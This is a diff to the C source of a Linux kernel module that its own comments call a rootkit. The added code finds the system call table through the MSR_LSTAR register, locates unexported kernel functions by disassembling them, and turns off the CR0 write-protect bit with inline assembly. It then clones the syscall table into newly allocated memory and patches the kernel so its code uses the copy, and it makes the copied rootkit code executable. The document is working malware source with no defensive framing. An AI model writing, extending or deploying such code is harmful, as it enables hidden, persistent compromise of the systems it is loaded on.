@@ -66,19 +66,35 @@
 //void *readfile(const char *file, size_t *len);
 int disassemble(void *code, size_t code_len);
 void *disass_search_inst_addr(void *code, const char *inst, const char *fmt, size_t max, int position, void **location_addr);
-void *search_sct_fastcall(void **psct_addr);
-void *search_sct_slowpath(void **psct_addr);
+void *search_sct_fastcall(unsigned int **psct_addr);
+void *search_sct_slowpath(unsigned int **psct_addr);
 void *memmem(const void *haystack, size_t hs_len, const void *needle, size_t n_len);
 void hook_kernel_funcs(void);
 int set_memory_rw(unsigned long addr, int pages);
 int set_memory_ro(unsigned long addr, int pages);
 void *search_change_page_attr_set_clr(void *set_memory);
+void *search___vmalloc_node_range(void *__vmalloc);
 
 /*
  * Global variables.
  */
 void (*f_kernel_test)(void) = NULL;
-int (*change_page_attr_set_clr)(unsigned long *addr, int numpages, pgprot_t mask_set, pgprot_t mask_clr, int force_split, int in_flag, struct page **pages);
+int (*f_change_page_attr_set_clr)(unsigned long *addr, int numpages, pgprot_t mask_set, pgprot_t mask_clr, int force_split, int in_flag, struct page **pages) = NULL;
+void * (*f__vmalloc_node_range)(unsigned long size, unsigned long align,
+            unsigned long start, unsigned long end, gfp_t gfp_mask,
+            pgprot_t prot, unsigned long vm_flags, int node,
+            const void *caller) = NULL;
+
+void open_kernel(void);
+void close_kernel(void);
+
+void open_kernel(void) {
+	asm("cli\n\tmov\t%cr0, %rax\n\tand\t$0xfffffffffffeffff, %rax\n\tmov\t%rax, %cr0\n\tsti");
+}
+
+void close_kernel(void) {
+	asm("cli\n\tmov\t%cr0, %rax\n\tor\t$0x10000, %rax\n\tmov\t%rax, %cr0\n\tsti");
+}
 
 int init_module(void)
 {
@@ -121,18 +137,72 @@ int init_module(void)
      */
     f_sys_write = sys_call_table[__NR_write]; // now we can print into stdout and stderr =)
 
-	pinfo("Hurra! sys_call_table = %p, location = %p\n", sys_call_table, psct_fastcall);
+	pinfo("Hurra! sys_call_table = %p, fastcall_location = %p, slowpath_location = %p\n", sys_call_table, psct_fastcall, psct_slowpath);
 
 	/*
 	 * Search not exported symbols.
 	 */
-	change_page_attr_set_clr = search_change_page_attr_set_clr(set_memory_x);
-	if (change_page_attr_set_clr != NULL) {
-		pinfo("Hurra! change_page_attr_set_clr() = %p\n", change_page_attr_set_clr);
+	f_change_page_attr_set_clr = search_change_page_attr_set_clr(set_memory_x);
+	if (f_change_page_attr_set_clr != NULL) {
+		pinfo("Hurra! change_page_attr_set_clr() = %p\n", f_change_page_attr_set_clr);
 	} else {
 		perr("Sorry, can't find change_page_attr_set_clr().\n");
 		return 0;
 	}
+
+	f__vmalloc_node_range = search___vmalloc_node_range(__vmalloc);
+	if (f__vmalloc_node_range != NULL) {
+		pinfo("Hurra! __vmalloc_node_range() = %p\n", f__vmalloc_node_range);
+	} else {
+		perr("Sorry, can't find __vmalloc_node_range().\n");
+		return 0;
+	}
+
+	/*
+	 * Reserve & clone a new (our) sys_call_table.
+	 */
+	size_t my_sct_len = 0;
+	while(sys_call_table[my_sct_len]) {
+		my_sct_len ++;
+	}
+	my_sct = f__vmalloc_node_range(PAGE_ROUND_UP(my_sct_len * sizeof(void *)), 1,
+                    MODULES_VADDR,
+                    MODULES_END, GFP_KERNEL,
+                    PAGE_KERNEL, 0, NUMA_NO_NODE,
+                    __builtin_return_address(0));
+
+	if (my_sct == NULL) {
+		perr("Sorry, can't reserve memory with __vmalloc_node_range().\n");
+		return 0;
+	}
+
+	my_sct_len = 0;
+	while(sys_call_table[my_sct_len]) {
+		my_sct[my_sct_len] = sys_call_table[my_sct_len];
+		my_sct_len ++;
+	}
+
+	pinfo("my_sct = %p, len = %d\n", my_sct, my_sct_len);
+
+	/*
+	 * Install the new sct.
+	 */
+	//int ret = set_memory_rw(PAGE_ROUND_DOWN(psct_fastcall), 1);
+	unsigned long addr = (unsigned long)psct_fastcall & PAGE_MASK;
+	int numpages = (PAGE_SIZE - ((unsigned long)psct_fastcall & ~PAGE_MASK) >= 4) ? 1 : 2;
+	int ret = set_memory_rw(addr, numpages);
+	pinfo("addr %p numpages %d mem rw = %d\n", addr, numpages, ret);
+	addr = (unsigned int) my_sct;
+	open_kernel();
+	ret = probe_kernel_write(psct_fastcall, &addr, 4);
+	close_kernel();
+	pinfo("%d\n", ret);
+	ret = probe_kernel_write(psct_fastcall, &addr, 4);
+	pinfo("%d\n", ret);
+	//*psct_fastcall = (unsigned int) my_sct;
+	pinfo("%p\n", *psct_fastcall);
+	set_memory_ro(PAGE_ROUND_DOWN(psct_fastcall), 1);
+
 /*
 	pinfo("%p\n", __rdmsr(MSR_LSTAR));
 	char *p = __rdmsr(MSR_LSTAR);
@@ -177,7 +247,8 @@ int init_module(void)
 		/*
 		 * Make our rootkit code executable.
 		 */
-		set_memory_x(PAGE_ROUND_DOWN(kernel_addr), kernel_pages);
+		ret = set_memory_x(PAGE_ROUND_DOWN(kernel_addr), kernel_pages);
+		pinfo("ret = %d\n", ret);
 		//pinfo("kernel_addr's pages are now executable.\n");
 
 		memcpy(kernel_addr, &kernel_start, kernel_len);
@@ -277,26 +348,32 @@ void *search_change_page_attr_set_clr(void *set_memory) {
 	return addr;
 }
 
-static inline int change_page_attr_set(unsigned long *addr, int numpages,
+void *search___vmalloc_node_range(void *__vmalloc) {
+	void *tmp;
+	void *addr = disass_search_inst_addr(__vmalloc, "call", "%lx", 0x100, 1, &tmp);
+	return addr;
+}
+
+static inline int f_change_page_attr_set(unsigned long *addr, int numpages,
                        pgprot_t mask, int array)
 {
-    return change_page_attr_set_clr(addr, numpages, mask, __pgprot(0), 0,
+    return f_change_page_attr_set_clr(addr, numpages, mask, __pgprot(0), 0,
         (array ? CPA_ARRAY : 0), NULL);
 }
 
-static inline int change_page_attr_clear(unsigned long *addr, int numpages,
+static inline int f_change_page_attr_clear(unsigned long *addr, int numpages,
                      pgprot_t mask, int array)
 {
-    return change_page_attr_set_clr(addr, numpages, __pgprot(0), mask, 0,
+    return f_change_page_attr_set_clr(addr, numpages, __pgprot(0), mask, 0,
         (array ? CPA_ARRAY : 0), NULL);
 }
 
 int set_memory_rw(unsigned long addr, int numpages) {
-	return change_page_attr_set(&addr, numpages, __pgprot(_PAGE_RW), 0);
+	return f_change_page_attr_set(&addr, numpages, __pgprot(_PAGE_RW), 0);
 }
 
 int set_memory_ro(unsigned long addr, int numpages) {
-	return change_page_attr_clear(&addr, numpages, __pgprot(_PAGE_RW), 0);
+	return f_change_page_attr_clear(&addr, numpages, __pgprot(_PAGE_RW), 0);
 }
 
 void hook_kernel_funcs(void) {
@@ -346,7 +423,7 @@ void *memmem(const void *haystack, size_t hs_len, const void *needle, size_t n_l
     return NULL;
 }
 
-void *search_sct_fastcall(void **psct_addr) {
+void *search_sct_fastcall(unsigned int **psct_addr) {
 	void *sct = (void *) __rdmsr(MSR_LSTAR);
 	// DO NOT call disassemble() in this function as sys_write is not yet imported!
 	// or import sys_write into f_sys_write before calling:
@@ -360,7 +437,7 @@ void *search_sct_fastcall(void **psct_addr) {
 		sct = memmem(sct, 0x100, "\xff\x14\xc5", 3); // search: call *sys_call_table(, %rax, 8)
 		if (sct) {
 			sct += 3;
-			*psct_addr = sct;
+			*psct_addr = (unsigned int *)sct;
 			sct = (void *) (0xffffffffffffffff - (0 - *(unsigned int *) sct) + 1);
 			return sct;
 		} else{
@@ -375,17 +452,17 @@ void *search_sct_fastcall(void **psct_addr) {
 	return NULL;
 }
 
-void *search_sct_slowpath(void **psct_addr) {
+void *search_sct_slowpath(unsigned int **psct_addr) {
 	void *sct = (void *) __rdmsr(MSR_LSTAR);
 	sct = memmem(sct, 0x100, "\x48\xc7\xc7", 3); // search: mov $address, %rdi; jmp *%rdi
 	if (memcmp(sct + 3 + 4, "\xff\xe7", 2) == 0) { // found!
 		sct += 3;
 		sct = (void *) (0xffffffffffffffff - (0 - *(unsigned int *) sct) + 1) + (2 + 1 + 0x31);
-		sct = disass_search_inst_addr(sct, "jne", "%lx", 0x100, 1, psct_addr);
+		sct = disass_search_inst_addr(sct, "jne", "%lx", 0x100, 1, (void **)psct_addr);
 		if (sct != NULL) {
-			sct = disass_search_inst_addr(sct, "call", "%lx", 0x100, 1, psct_addr);
+			sct = disass_search_inst_addr(sct, "call", "%lx", 0x100, 1, (void **)psct_addr);
 			if (sct != NULL) {
-				sct = disass_search_inst_addr(sct, "call", "*-%lx(", 0x100, 1, psct_addr);
+				sct = disass_search_inst_addr(sct, "call", "*-%lx(", 0x100, 1, (void **)psct_addr);
 				sct = (void *)((long) sct * -1);
 				return sct;
 			}
